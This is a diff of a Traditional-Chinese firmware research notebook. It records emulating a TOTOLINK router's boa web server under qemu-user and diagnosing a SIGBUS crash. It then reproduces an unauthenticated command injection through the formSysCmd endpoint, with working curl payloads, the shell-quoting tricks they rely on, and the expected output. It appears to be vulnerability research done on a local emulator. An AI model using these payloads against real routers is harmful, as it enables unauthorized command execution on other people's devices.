@@ -443,15 +443,83 @@ sudo bash tools/qemu-env.sh diff HW_WLAN0_WSC_PIN 87654321
 > 只改 `HW_WLAN0_REG_DOMAIN` 的一次執行，diff 裡出現了**上一次測試的** WPS PIN
 > 七個 byte。**`qemu-env.sh reset` 必須同時清檔案和 shm，而那是兩件看起來像一件的事。**
 
-> ❌ **`boa` 在這裡服務不了請求，而那不是設定錯誤。** 它死在
-> `libapmib.so+0x27dc` 的 `sh s7,0(s8)` —— 一個 16-bit 對齊陷阱，標準 MIPS I 編碼
-> （opcode `0x29`，手算過）。裝置的 kernel 會修它，`qemu-user` 沒有 guest kernel 可以修。
-> **換 CPU model 沒有用。** 所以 HTTP 那幾輪只能在真機上做（`A3.5`）。
-
 > ⚠️ **在這裡驗 payload 的引號與跳脫，不要在真機上現想。**
 > 這台的 BusyBox 1.13.4 只編了 48 個 applet,**`id` 不是其中一個** ——
 > `…;id > /var/web/x.txt;#` 會建出一個空檔案，而那跟「參數被過濾掉」看起來一模一樣。
 > `cat /etc/version` 才是對的 payload：輸出同時證明執行成功並指出 build。
+
+#### A1.4.1 讓 `boa` 真的服務請求（關 `P0-9`）
+
+> 🔴 **這一小節推翻了本檔到 2026-08-17 為止寫在這個位置的一段話。**
+> 原文是：「`boa` 在這裡服務不了請求……它死在 `libapmib.so+0x27dc` 的
+> `sh s7,0(s8)`，裝置的 kernel 會修它，`qemu-user` 沒有 guest kernel 可以修，
+> 換 CPU model 沒有用。」**對齊陷阱是真的，位置也是真的，結論太寬。**
+
+用 `-strace` 量出來的死法：
+
+```text
+412 open("/dev/mtdblock0",O_RDONLY) = 3
+412 lseek(3,49152,SEEK_SET) = 49152
+412 read(3,0x490018,7490) = 7490
+412 close(3) = 0
+412 open("/web/config.dat",O_RDWR|O_CREAT|O_TRUNC,0400000) = 3
+--- SIGBUS {si_signo=SIGBUS, si_code=1, si_addr=0x00492b41} ---
+```
+
+**它死在「產生 `/web/config.dat`」那一步，不是死在服務請求。**
+`si_addr` 是奇數位址，跟那個 `sh` 對得上。把那**一個** `open()` 弄成失敗
+（讓 `config.dat` 是一個目錄，`O_RDWR` 就回 `EISDIR`），`boa` 印
+`Create config file error!`、繼續跑、bind、然後回應。
+
+```bash
+sudo bash tools/qemu-env.sh serve 8080
+```
+
+**預期 —— 而重點是第二個對照組：**
+
+```text
+  control ok: login.htm 200 (exempt page served)
+  control ok: blank.htm 302 (gated page redirected)
+boa is serving on 127.0.0.1:8080 (pid 406).  Stop it with:
+  sudo tools/qemu-env.sh stop
+```
+
+> 🔴 **「它回應了」不等於「這個韌體用它的方式在回應」。** 所以對照組有兩個：
+> 一個豁免頁必須 `200`，一個受保護頁必須 `302`。
+> 那正是 W04-2 逐指令讀出來、W05 在實機上量到的閘門模型 ——
+> **兩個都成立才代表這裡測到的東西可以外推。** 只有第一個成立的話，
+> 埠上的可能是別的東西。工具在對照組沒過時**拒絕**回報服務已啟動。
+
+```bash
+curl -s -o /dev/null -w 'no-param  POST: HTTP %{http_code}\n' \
+  -X POST http://127.0.0.1:8080/boafrm/formSysCmd --data 'submit-url=/syscmd.htm'
+curl -s -o /dev/null -w 'inject    POST: HTTP %{http_code}\n' \
+  -X POST http://127.0.0.1:8080/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=cat /etc/version > /var/web/w06emu.txt;#' \
+  --data 'submit-url=/syscmd.htm'
+sleep 2
+curl -s http://127.0.0.1:8080/w06emu.txt
+```
+
+**預期**：
+
+```text
+no-param  POST: HTTP 302
+inject    POST: HTTP 302
+TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
+```
+
+> ★ **未認證命令注入，在桌機上端到端重現，一台裝置都沒接。**
+> 不帶 `sysCmd` 的那一發是對照組：它也回 `302`，而且**什麼都沒建立** ——
+> 所以「回 302」不是成功的訊號，docroot 裡出現檔案才是。
+
+> ⚠️ **拿掉 `;#` 再打一次，會拿到 `HTTP 204`、0 bytes。** 檔案建立了，內容是空的
+> —— handler 自己在後面接 `2>&1 > /tmp/syscmd.log`，而 `sh` 裡最後一個 stdout
+> 重導向贏。**這是先從 binary 的格式字串 `%s 2>&1 > %s` 推出來、再在這裡看到的。**
+
+> ❌ **代價要講出來：模擬的 server 上拿不到 `/config.dat`** ——
+> 因為擋住那個 `open()` 的就是那個同名目錄。**鏈的第 ①② 環仍然只有實機做得到**，
+> 第 ③④ 環和閘門在這裡重現。**這是這條路的邊界，不是它的失敗。**
 
 ---
 
